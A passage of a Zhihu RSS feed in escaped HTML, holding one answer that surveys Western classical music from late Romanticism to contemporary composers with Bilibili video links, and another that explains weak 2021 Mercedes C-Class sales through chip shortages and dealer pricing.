noreferrer\">瓦格纳 - 特里斯坦与伊索尔德第一幕前奏曲 (和弦解析)</a><p data-pid=\"i-n9O7dQ\">除了瓦格纳，晚期浪漫派的其他作曲家也有这样的特点，因为听众的欣赏阈值也在不断提高，简单的调性变化已经不能满足大众的期待了，所以调性的变化也越来越复杂。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV184411M7fm%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-1890ff9bdab77d4b4534fb48d9e9ffe6_bh.jpg\" data-image-width=\"1152\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">理查德·施特劳斯 -《变形》Metamorphosen</a><h3>3. 印象主义</h3>\n<p data-pid=\"a-W_GDR8\">印象主义不是紧接在晚期浪漫主义之后的时期，也并不特指某个时期。而是在浪漫主义晚期过渡到现代音乐时期的一个音乐分支。因为同一时期，除了音乐，绘画，诗歌，文学等其他艺术形式也在发展。音乐同样也会受到这些艺术的影响。印象主义音乐认为音乐不仅仅可以表现情感，同样可以表现朦胧的氛围和情绪。所以他们打破了配器一定要清晰的规则，很多听上去不清晰的配器，可能仅仅是为了追求某种音响效果。从印象主义开始，配器这个维度的限制也被打破了。作曲家的思路也慢慢开始从“音符”逐渐转变成“音响”。而各种平行和声，特殊调式的运用，也极大地丰富了音乐的语汇。印象主义的代表人物有德彪西、拉威尔、莉莉·布朗热等（虽然他们都否认自己是印象派）。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1qQ4y1r7HT%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-d92c8ed5bc4e28886eb09a6d1bb6c863_bh.jpg\" data-image-width=\"2481\" data-image-height=\"1550\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">德彪西 - 牧神午后前奏曲</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1ot411Q78s%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-adf249b6e8bc8150991dcd56b172d99c_bh.jpg\" data-image-width=\"852\" data-image-height=\"480\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">拉威尔 - 为竖琴，长笛，单簧管和弦乐四重奏所作的的引子和快板</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1MJ41187Lr%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-a99d2f76d2ebe07c6a6f6e3510025fc5_bh.jpg\" data-image-width=\"1920\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">莉莉·布朗热 - 《诗篇129》从我少年，世人就与我为难</a><h2>五、现代主义&amp;二十世纪音乐</h2>\n<p data-pid=\"0gNsb5f7\">如果上面的音乐你顺着听下来，就会发现其实从巴洛克到古典主义到浪漫主义，发展一直是连续的。同样，悦耳的浪漫主义音乐也并不是突然某一天就变成了“难听的”现代主义音乐的。虽然会有一些标志性的事件或者作品标志着现代主义的开端，但是实际上这就是音乐发展，或者说西方古典音乐发展的必然。因为无论是听众还是作曲家，大家听相同的东西听太多了之后，总会需要更新鲜，更刺激更宏大的音乐。浪漫主义音乐无论如何发展，最终都会走向现代主义音乐。</p>\n<p data-pid=\"0-8lGX-q\">作为里姆斯基·科萨科夫的学生的斯特拉文斯基，他早期作品还是带有明显的晚期浪漫主义色彩的，比如《火鸟》、《彼得鲁什卡》等等。但是最值得一提的还是他的《春之祭》，这部作品在1913年首演的时候，引起了不小的骚乱，因为他的音乐语汇太过超前，打破了之前音乐里的诸多禁忌，比如不协和度非常高的复合和弦，不规整的拍子，以及乐器在罕见的极高极低音域演奏的怪异的配器等等。当时无论是作曲家还是听众，对这首曲子的评价都非常两极分化。一些评论者认为这部作品非常先锋，打破了传统的禁锢，而一部分评论者认为这部作品写的非常粗野低俗。然而时至今日，用今天的“学院派”的眼光看的话，这部作品已经不再先锋，甚至有点old school。而且现在大家普遍也接受了它属于“古典音乐”，比如给小朋友当古典音乐启蒙的迪士尼的《幻想曲2000》里就收录了它。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1sb4y1D7SV%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">斯特拉文斯基 - 春之祭</a><p data-pid=\"WvzEQxUu\">而在斯特拉文斯基创作春之祭的同一时期，还有很多浪漫主义及民族乐派的作曲家在创作浪漫主义音乐。比如下面这首西贝柳斯在1914年创作的《海洋女神 The Oceanides》，就还是有很浓的浪漫主义色彩。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1pv41187TG%3Ffrom%3Dsearch%26seid%3D1932048042110414668%26spm_id_from%3D333.337.0.0\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-97ac7a0c3c7e725e44e2b86c5008e372_bh.jpg\" data-image-width=\"1575\" data-image-height=\"985\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">西贝柳斯 - 海洋女神 The Oceanides Op. 73</a><p data-pid=\"sQmy4ymV\">当然，最值得一提的还是阿诺德·勋伯格（Arnold Schoenberg）。对他的评价是矛盾的，讨厌他的人，认为就是他的无调性理论，以及受他影响而兴起的序列主义音乐的风潮，直接摧毁了古典音乐的可听性；而爱他的人，认为他不仅作品写的很好，同时也解放了音乐更多的可能性，是一个桥接了两个时代的伟大人物。</p>\n<p data-pid=\"Nj-P2CiZ\">很多人一看到勋伯格，就会想到各种怪异且难听的无调性曲目，然而事实上勋伯格写晚期浪漫主义风格写的非常好，比如他的《古雷之歌》。各种浪漫主义风格下的调性布局，曲式及和声技术已经运用的炉火纯青，而且旋律也非常优美。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1zp4y1Y738%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-9d5510a1c6768a80be844150762ae945_bh.jpg\" data-image-width=\"1148\" data-image-height=\"718\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">勋伯格 - 古雷之歌</a><p data-pid=\"cIqPfOsV\">然而在1914年8月，他公然抨击斯特拉文斯基，拉威尔等人的音乐，认为他们的曲目是庸俗过时的，他曾这样写到：“Now comes the reckoning! Now we will throw these mediocre kitschmongers into slavery, and teach them to venerate the German spirit and to worship the German God!”</p>\n<p data-pid=\"XjzgjmFP\">此后，他和他的学生们组建了“第二维也纳乐派（Second Viennese School）”，他们创作的音乐风格也从晚期浪漫派逐渐发展到无固定调性的音乐，再到自由无调性，最后演化出了十二音序列主义。第二维也纳乐派的代表作曲家除了勋伯格之外，还有阿尔班·贝尔格、安东·韦伯恩等等。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1aB4y1w7Me%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-08350de16d4e8c60d5e18618a111b460_bh.jpg\" data-image-width=\"640\" data-image-height=\"360\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">勋伯格 - 《月迷皮埃罗》Pierrot lunaire</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1hz4y1U7ce%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-300b19fb4a34a367b900749926953084_bh.jpg\" data-image-width=\"1728\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">贝尔格 - 《抒情组曲》Lyrische Suite</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1nt4y1v7FE%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-d4f64d6d89bac4a0798a61f5ae83ccbd_bh.jpg\" data-image-width=\"1728\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">韦伯恩 - 六首管弦乐曲</a><p data-pid=\"n_el5JhM\">这些音乐乍一听确实不太容易接受，确实也不太可能作为古典音乐的入门曲目。而且哪怕是听了很久的古典音乐的听众，如果没有经历过古典主义-早期浪漫-晚期浪漫这种听觉阈值随着曲目创作年代逐渐上升的过程，也是基本没办法欣赏的。所以序列音乐和无调性虽然在20世纪早期和中期风靡过一段时间，但是后来随着流行音乐的发展，爵士乐、乃至后来摇滚乐的兴起，听众慢慢地就流失了。<b>序列音乐在今天看来，也已经是100多岁的老古董了。当时很先锋的东西，早已变成了今天的陈词滥调。今天如果谁还在音乐学院里写序列，别人肯定会以为你在搞复古。虽然对于这类风格能否算作是“古典音乐”，至今还颇有争议，但是谁也无法否认，这条音乐的发展路线确实也是巴洛克-古典-浪漫之后必经的分支之一。</b></p>\n<p data-pid=\"kYLQ9iVb\">当然，现代音乐不仅仅只有无调性和序列音乐，不同国家，不同流派的作曲家在晚期浪漫主义之后对音乐边界的探索与突破也各不相同。法国的作曲家就更加注重和声的色彩，配器的音响和音色的表达等等，虽然和声配器旋律这些相比晚浪会难把握一些，但是都非常有可听性。代表作曲家有比如普朗克，梅西安，瓦雷兹等等。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Sr4y1v7EE%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-a36ea534123e552d126a7a97ad2d600e_bh.jpg\" data-image-width=\"708\" data-image-height=\"443\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【普朗克】Francis Poulenc-Melancolie，FP 105</a><p data-pid=\"GTBF5IUU\">下面这首是我非常喜欢的一首无伴奏人声合唱作品，特别美！</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Qs411h7k9%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-49eaa367d1f999525d8820f7d79d10f1_bh.jpg\" data-image-width=\"1280\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【奥利维埃·梅西安】Olivier Messiaen, O Sacrum Convivium!</a><p data-pid=\"NNJ7UInU\">瓦雷兹的音乐更强调音色和节奏，“音乐是‘Organized Sound’”的理念最先也是他先提出来的。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1TZ4y1T7vP%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-910b72699b433af66717581dcb16a18b_bh.jpg\" data-image-width=\"964\" data-image-height=\"602\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【瓦雷兹】- Ionisation</a><h2>六、当代音乐（Contemporary Music）</h2>\n<p data-pid=\"aMCNlJah\">当代音乐又被称为当代古典音乐（Contemporary Classical Music），和现代音乐之间也并没有一个明显的分界。维基百科对当代音乐的定义是“Classical music composed close to present day”，即<b>“当代创作的古典音乐”</b>。在现代主义音乐时期，音乐的边界就已经被极大地扩展了，调性已经被瓦解，而节奏，音色，曲式，体裁，乐器制造技术，演奏法等等都有了突飞猛进的发展。所以到了当代，音乐创作其实已经非常自由了，任何的声音，都能作为音乐材料。所以当代音乐并没有一个固定的形态。有一些当代作曲家，回归了调性和可听性，比如上面提到的普朗克，以及日本的吉松隆等等；而有一些作曲家，则将对传统乐器和写作方式进行拓展，在传统的编制中寻找新的音响和声音组织方式，比如潘德列茨基、利盖蒂（Gyorgy Ligeti）和乔治·克拉姆（George Crumb）；而有一些作曲家则厌倦了“古典音乐”越来越复杂的倾向，转投了极简主义，音乐更简单了，却也更先锋了，比如菲利普·格拉斯（Phillp Glass），约翰·亚当姆斯（John Adams），斯蒂夫·莱奇（Steve Reich）；当然也有一些作曲家延续着音乐发展会越来越复杂的路线，搞起了复杂主义，比如布莱恩·芬尼豪（Brian Ferneyhough）；也有作曲家利用新的电子音乐的技术，搞起了Electro-Acoustic music，比如Kajia Sariaho，斯托克豪森，或者是搞起了频谱音乐，比如Gerard Grisey，或者搞起了具象音乐，比如Pierre Schaeffer等等。<i>（另：从这一时期开始，因为古典音乐同时在往很多的分支发展，所以曲目就不按照创作时间顺序排列而是按风格排列了）</i></p>\n<p data-pid=\"LW8InMDR\">很多学院派会觉得吉松隆的曲子只是美和好听，但是却没有什么深度。但是我认为能美到这样的地步，而且还美得很有东方的气质，美得很有个人特色，这本身就是一件非常困难和非常高级的事了。并不是把曲子当成精密仪器一般去设计序列设计结构才是有深度，更高级的听觉上和情绪上的审美体验同样是值得作曲家追求的目标。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV11W411a7x9%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-0e1ec53ac9556686761cdc4d526f00f0_bh.jpg\" data-image-width=\"1280\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">吉松隆 - 鸟静静的 Takashi Yoshimatsu And Birds are still... Op.72</a><p data-pid=\"hZ_Ymr7v\">Arvo Part是极简主义代表人物之一，写作也非常具有可听性。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1ci4y1c71r%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-5f184acbf4b1e73e0b65782ce816a24c_bh.jpg\" data-image-width=\"1200\" data-image-height=\"750\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【Arvo Pärt】 - Summa for String Orchestral</a><p data-pid=\"U0Y5Ybex\">George Crumb前两天去世了，默哀。他的作品里有很多对新音色的探索，也很有意思。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Z3411s7TQ%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-5473fce48bae4da51eabbd307844b9ca_bh.jpg\" data-image-width=\"1728\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">乔治·克拉姆 (George Crumb): 鲸鱼之声_哔哩哔哩_bilibili</a><p data-pid=\"yy3aioJA\">Kajia Saariaho也是我最喜欢的作曲家之一，她的审美非常好，能把很多在晚浪和现代主义里根本见不到的音响效果用的即自然又漂亮。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1JM4y157Po%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-c6482f634477cc5c349d5a184b171bb8_bh.jpg\" data-image-width=\"2770\" data-image-height=\"1728\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【Kaija Saariaho】七只蝴蝶，为独奏大提琴而作  Sept Papillons for solo cello_哔哩哔哩_bilibili</a><p data-pid=\"u4fRe7Tq\">Ligeti的《大气层》，曾被库布里克用作《2001太空漫游》的配乐，可以说是对传统管弦乐队的音色及对位的极限的一种探索了。虽然确实不太好听，但是这种极端的动态以及频段的对比带来的夸张的表现力，却是晚浪时期的音乐完全做不到的。当然，现在这类Sound Wall式的音色，早就已经用在商业领域了，Hans Zimmer给《敦刻尔克》和《沙丘》的配乐里，都能听到类似的音响。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV11D4y1R76M%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-e80fe49dca5ddaa3e417033c70e1658f_bh.jpg\" data-image-width=\"1080\" data-image-height=\"675\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【转载】里盖蒂 大气层_哔哩哔哩_bilibili</a><p data-pid=\"9TKZQxN3\">当然，也有作曲家吸取了其他音乐风格，比如爵士乐和布鲁斯的精华，并将其用在古典音乐的创作上。比如Nikolai Kapustin。也很有个人特色，并且很美。虽然Kapustin相比同一时期的作曲家，在音色和乐器上相对保守，但是他的音乐语汇却是非常新鲜的，而且驾驭古典和爵士的能力都非常强。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1ah411m7Xh%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-d06b96372e3a1a09e8c25aa06152c3c6_bh.jpg\" data-image-width=\"1152\" data-image-height=\"720\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【卡普斯汀】中音萨克斯协奏曲 Op. 50_哔哩哔哩_bilibili</a><p data-pid=\"TntL5XeP\">当然，我们国家今天也依然有很多在继续写作“当代古典音乐”的作曲家。比如朱践耳、罗忠镕、陈其钢、王西麟、谭盾、郭文景、叶小刚、周龙、陈怡、贾国平、秦文琛、梁雷等等。中国的作曲家的作品可听性其实都还挺高的，既有技术认知的美，也有听觉感知的美。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1V4411f7QS%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-50a95dd2729e4bc067ac3e2dde4e384f_bh.jpg\" data-image-width=\"1920\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">陈其钢 - 二黄_哔哩哔哩_bilibili</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1K341187qW%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-91f53d3f375e246a029661148be087f8_bh.jpg\" data-image-width=\"1184\" data-image-height=\"736\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【贾国平】清风静响（2011）_哔哩哔哩_bilibili</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Cv411q7qc%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-2e7776a2de4b093dc9edac19b00440e1_bh.jpg\" data-image-width=\"3306\" data-image-height=\"2066\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【秦文琛】 - 【行空】Across the Skies (c.2012)_哔哩哔哩_bilibili</a><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV16r4y1r7vF%3Fshare_source%3Dcopy_web\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-d911415dd968d8a192afb89d97f88c26_bh.jpg\" data-image-width=\"1728\" data-image-height=\"1080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【大提琴】梁雷 - 风（1998）_哔哩哔哩_bilibili</a><h2>七、总结</h2>\n<p data-pid=\"1fH4YEM0\">最后，回到题主的问题，为什么现在很少有人去创作古典音乐了？</p>\n<p data-pid=\"-qngKnhX\">首先，最大的可能是被翻译带跑了。古典音乐（Classical music）中的“Classical”更准确应该翻译为“经典”，而非“古典”。因为说到古典，大家不自觉就会认为这个音乐应该是几百年前的音乐。但实际上，“经典音乐”的生命时至今日也还一直在延续。虽然今天在诸多其他的音乐风格的夹击下，它的听众和市场也在日益流失，但是今天坚持创作“经典音乐”的作曲家依然还有很多。</p>\n<p data-pid=\"7JqqTDVs\"><b>其实，如果你仔细看完了上文，并且大概按照时代听了上面的曲目的话，你能很清晰地看到“经典音乐”发展的脉络。最开始的时候，音乐就只有一条简单的人声单旋律；到了奥尔加农时期引入了第二条人声旋律；再从两个声部平行到发展出初级对位；再到进入到巴洛克复调音乐时期；再到随着复调音乐的发展，声部的增加，和声学也变得重要起来；再到随着器乐的发展，产生了最初的管弦乐团；再到随着和声学的发展，主调音乐兴起，并且乐团编制越来越大；再到主调音乐逐渐复杂，曲式学和配器法也逐渐成熟；再到听众不满足于传统的调性，于是作曲家开始思考如何摆脱传统调性的束缚；再到作曲家开始拓展表现力的边界，配器的规则和节奏的规则也被打破了；再到音乐开始音响化，调性终于崩解；直到最后作曲家终于获得了更多的自由，可以更随心所欲地探求声音组合了……</b></p>\n<p data-pid=\"FgP9iPpo\"><b>所以，经典音乐这条发展的脉络是一直没有中断过的。从最初的单线条人声到今天各种复杂的Electro-Acoustic，经典音乐的创作的内核始终都是没有变的，那就是慢慢变得更复杂，在变复杂的过程中产生一些规则，再把规则不断打破的过程，同时也是不断探求更新的，更有意思的声音组合的过程。</b></p>\n<p data-pid=\"2jlGgdRa\">当然，因为每个人心中对“古典音乐”的印象和期待都不一样，所以导致大家看到的结果也是不一样的。原教旨主义者可能认为只有维也纳三杰的“古典主义时期音乐”才算“古典音乐”，连浪漫主义时期的都算不上古典音乐。<b>而大多数普通听众心目中的“古典音乐”，可能指的仅仅是从巴洛克到浪漫主义晚期这段时期的“古典音乐”。</b>而如果确实只看这段时间的音乐的话，那古典音乐的确已经死了，因为古典音乐总要发展的，一旦发展了，就不再是原来那个形态了。举个例子，比如在60年代开创了一代潮流的披头士，今天听起来编配和混音就已经过时了，而这才过了50多年；同样的，听腻了Bebop的人，自然会爱上Miles Davis的Cool Jazz，然而无论是哪种jazz，今天也一样已经没什么人听了。而古典音乐作为一个延续了400多年的音乐形态，同样也不可能永远写一样的东西的，因为没人要听父辈们听的东西。所以，如果你觉得晚期浪漫派之后作品就不算古典音乐了，那么你能明确界定什么时候才是“古典”和“现代”的分界呢？是《春之祭》，还是《特里斯坦与伊索尔德》，还是《月迷皮埃罗》，或者说你觉得梅西安的曲子听起来依然很古典，又或者说更早时候的德彪西和拉威尔就已经不算古典了呢？</p>\n<p data-pid=\"EITvwkDH\">其实没有答案，这个只和你对音乐的接受度和包容度有关。你不妨顺着年代再听一听，从什么年代，什么作品之后就再也听不下去了，那么这个时间点或者这部作品就是你自己的“古典”与“现代”的分界了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/molho?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Molho</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/510243982/answer/2342985445?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">54 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/359753381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些对古典音乐的认识只限于“莫扎特”“贝多芬”的人，突然接触到浪漫主义晚期乃至现代派，会是什么感受？</a><br><a href=\"http://www.zhihu.com/question/265355240?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在还有没有作曲家在创作古典主义风格或浪漫主义风格的作品？</a><br>\n","link":"http://www.zhihu.com/question/510243982/answer/2342985445?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"奔驰 C 级在 2021 下半年月销量未过万，似乎也低于 A4L/3系，奔驰是在 BBA 里落伍了吗？","date":"2022-02-11 02:22:38","description":"\n<p data-pid=\"01L-2tfj\">单纯品牌力的话，BBA中如果非要挑出一个“落伍”的，那就是奥迪。</p>\n<p data-pid=\"hPpBalZv\">道理很简单，芯片短缺期间BBA三家先后涨价并限制资源，BB终端受到的影响并不大，但奥迪没坚持多久就开始放价了。虽然平时我们都认为BBA依然是同一线豪华品牌，并且奥迪部分车型更具技术和性价比，但很明显消费市场用实际情况告诉大家：如果都按指导价销售的话，原本想买奥迪的都去奔驰宝马了。</p>\n<p data-pid=\"1MlaUckA\">回归正题，2021年影响奔驰C销售情况的主要因素就两个：</p>\n<ol>\n<li data-pid=\"OAyQMaGw\"><b>资源短缺，当时新款预计9月上市的时候，老款6-7月份在很多店就已经断货了，新款上市后货量一直供应不足，直至2021年底车源情况才有所缓解；</b></li>\n<li data-pid=\"xfT69X5h\"><b>新款内外观变化较大，因为视觉差异明显且新C被媒体取了个“小S”的称呼，时间搁置越久，老款越不好卖，所以必须压制新款的吸引力而优先出清老款；</b></li>\n</ol>\n<p><img src=\"https://pic1.zhimg.com/v2-92847bf93626536f4de46889cd4011c1_720w.jpeg?rss\" data-caption=\"有一说一我觉得新C的中控屏一点都不好看\" data-size=\"normal\" data-rawwidth=\"1477\" data-rawheight=\"831\" data-watermark=\"watermark\" data-original-src=\"v2-92847bf93626536f4de46889cd4011c1\" data-watermark-src=\"v2-54f608ede943763aabde19c8b852c9b3\" data-private-watermark-src=\"v2-a4fcb05fe43346be38dd3a904cbb8829\"></p>\n<p data-pid=\"1ZvNpkAe\">资源短缺这个困难各个车企都存在，但也在细节上各不相同。单拿BBA来说的话，奔驰的资源告急时间节点是晚于宝马和奥迪的，但进入资源短缺状态之后，奔驰格外缺车，不像宝马那样虽然不够卖但陆陆续续也能到一些车。</p>\n<p data-pid=\"33cEW1cp\">所以如果在那个时间段去逛一逛，会发现展厅最空的是奔驰，其次是宝马，而奥迪销售可能还会告诉你芯片短缺没什么大不了的过段时间就有车到了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bd73fde7052614123ab1193424238e87_720w.jpeg?rss\" data-caption=\"已经把奔驰的兄弟问麻了\" data-size=\"small\" data-rawwidth=\"828\" data-rawheight=\"1730\" data-watermark=\"watermark\" data-original-src=\"v2-bd73fde7052614123ab1193424238e87\" data-watermark-src=\"v2-78ac42e62ee0f9eaac572af2863f110a\" data-private-watermark-src=\"v2-fb6502ae7bf4f0d33166cd1d15db6660\"></p>\n<p data-pid=\"V6ttXvRD\">上个月，也就是2022年1月份的时候，一些奔驰4S店还有少量老款奔驰C的库存（车型代码801），普遍优惠幅度在45000，这个价格就是普通人不找关系不走野路子在4S店多谈谈就能拿到的价格，而新款奔驰C（车型代码802）的优惠幅度只有12000-15000，不仅如此，因为新款配置有所增加和改变，所以指导价也是上调了的。</p>\n<p data-pid=\"eHUd8l40\">这就回到了回答前两段碰瓷奥迪的问题——对于很多人来说，奥迪不是不好，而是超出了他们认可的定价区间，而奔驰也是故意拉大新老款的优惠幅度，使两代同款车型的落地价差距几乎能达到C级和A4L的差距，<b>这样一来，自然是老款更好卖一些，但整体销量必然受损，道理很简单：不是所有人在感觉新款超预算的时候还会乐意去买老款，没准就出门左转去宝马看3系了。</b></p>\n<p data-pid=\"ZOG4mB1I\">春节前我的老同学突然想给自己老婆换台车，问我C级和3系怎么选，我说你爱咋选咋选这个不要问我，看中哪款车我帮你去找关系要价就好了。结果这家伙奔着C级去却差点就买了CLA，眼看形势都有点控制不住了我就以他还没看宝马为由拉走了，到了宝马也略有离谱，看了两眼3系就站在5系旁边挪不动步了，随后惦记了好几天，想买5系，嘴上说还是给老婆买，其实内心已经是自己想开了。</p>\n<p data-pid=\"xIaBgMBE\">不过最终他结合家人意见和自己的喜好选了奔驰E，了解车源和行情的时候遇到了跟之前看C级一样的情况：<b>4S店有现车，但交车欲望并不强烈。</b></p>\n<p data-pid=\"FZ3YKUjK\">春节前常规进店客户，几乎就是统一口径没现车，需要订单排产，大概率节后提车。只有遇到极为难缠且利润大的客户单子，才会考虑放现车，除此以外，就是我们这种靠关系渠道而来的，不情不愿地给匀一台现车出来，这就是奔驰在春节前资源刚刚缓解时期的销售现状，卖车真不着急，利润优先。</p>\n<hr>\n<p data-pid=\"_-2M7PGa\">综合来看，不仅限于奔驰，在2021年很多品牌在车源紧张时期突然就尝到了之前梦寐以求的甜头：翻倍的利润，翻好几倍的利润。</p>\n<p data-pid=\"nKUBbvim\">价格涨了之后，稀少的车源依然无法满足打了折扣的市场需求，所以在2021年也是少见的厂商双方都在内心窃喜的一年，以前经销商想保利润，厂家要求上量，而彼时却没有了这一层烦恼。</p>\n<p data-pid=\"zwYNxoR3\">所以即使要评估BBA中谁落伍，也不应该拿2021年尤其下半年的数据来分析，你永远不知道到底哪一家表面数据难看私底下却乐开了花。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/vulry?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张凝澈</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/515544187/answer/2342630541?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">54 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/280623650?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">宝马三系，奥迪A4，奔驰c级，女新手纠结选择求建议！？</a><br><a 